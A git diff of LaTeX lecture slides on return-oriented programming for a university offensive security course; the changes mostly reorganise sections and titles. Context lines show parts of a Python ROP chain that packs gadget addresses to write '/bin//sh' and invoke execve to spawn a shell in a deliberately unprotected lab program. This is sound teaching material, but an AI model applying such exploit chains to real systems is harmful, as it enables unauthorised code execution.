@@ -19,17 +19,25 @@
 \institute{University Albstadt-Sigmaringen} 
 \date{\today} 
 \subject{Offensive Security Methods}
+\AtBeginSection[]
+{
+    \begin{frame}
+        \frametitle{Table of Contents}
+        \tableofcontents[currentsection]
+    \end{frame}
+}
 \begin{document}
 
 \begin{frame}
 \titlepage
 \end{frame}
 
-\begin{frame}
+\begin{frame}{Outline}
 \tableofcontents
 \end{frame}
 
 \section{Introduction}
+\subsection{Basic information}
 \begin{frame}
     \frametitle{What is Return Oriented Programming?}
     \begin{itemize}
@@ -87,7 +95,7 @@
 \begin{frame}[fragile]
     \frametitle{Useful gadgets: Load/Read from memory}
     \begin{itemize}
-        \item Load instructions are also really useful
+        \item Move instructions are also really useful
     \end{itemize}
     \begin{Verbatim}
         mov [rax], rxc; ret;
@@ -107,7 +115,7 @@
 \begin{frame}[fragile]
     \frametitle{Useful gadgets: Systemcalls, arithmetics}
     \begin{itemize}
-        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents.
+        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents
         \item Since programs run in userspace we have limited privileges, if we can find systemcalls we can, in combination with the arithmetic operations and pop instructions call arbitrary system calls
     \end{itemize}
     \begin{Verbatim}
@@ -124,9 +132,10 @@
     \end{figure}
 \end{frame}
 
-\section{Example}
+\section{Example: Open a shell}
+\subsection{Target Program}
 \begin{frame}[fragile]
-    \frametitle{Working example: Target Program and compilation}
+    \frametitle{Target Program and compilation}
     \begin{itemize}
         \item We compile the following program with stack protectors turned off
     \end{itemize}
@@ -149,8 +158,9 @@ int main(int argc, char *argv[])
 }
     \end{lstlisting}
 \end{frame}
+\subsection{General approach}
 \begin{frame}
-    \frametitle{Working example: Spawning a shell}
+    \frametitle{Spawning a shell: Approach}
     \begin{itemize}
         \item Using ropper we can find our desired gadgets
         \item Lets say we want to execute a shell using execve, for that we need to accomplish the following goals
@@ -162,8 +172,9 @@ int main(int argc, char *argv[])
         \end{enumerate}
     \end{itemize}
 \end{frame}
+\subsection{Generating the payload}
 \begin{frame}[fragile]
-    \frametitle{Working example: Putting it together, writing /bin}
+    \frametitle{Generating the payload, writing /bin}
     \begin{lstlisting}[style=code, language=python]
 from struct import pack
 
@@ -178,7 +189,7 @@ p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
 \end{frame}
 
 \begin{frame}[fragile]
-    \frametitle{Working example: Putting it together, writing //sh}
+    \frametitle{Generating the payload, writing //sh}
     \begin{lstlisting}[style=code, language=python]
 p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
 p += pack('<I', 0x080f0f70) # @ .data + 4
@@ -190,7 +201,7 @@ p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
 \end{frame}
 
 \begin{frame}[fragile]
-    \frametitle{Working example: Putting it together, init params}
+    \frametitle{Generating the payload, init params}
     \begin{lstlisting}[style=code, language=python]
 # write null byte after /bin/sh
 p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
@@ -211,7 +222,7 @@ p += pack('<I', 0x00000000) # @ NULL
 \end{frame}
 
 \begin{frame}[fragile]
-    \frametitle{Working example: Putting it together, init params, syscall}
+    \frametitle{Generating the payload, init params, syscall}
     \begin{lstlisting}[style=code, language=python]
 p += pack('<I', 0x080506c0) # xor eax, eax ; ret
 p += pack('<I', 0x08082a9e) # inc eax ; ret
@@ -240,7 +251,7 @@ print p
     \end{itemize}
 \end{frame}
 
-\section{Sources}
+\section*{Sources}
 \begin{frame}
     \frametitle{Sources}
     \url{https://trustfoundry.net/basic-rop-techniques-and-tricks/}
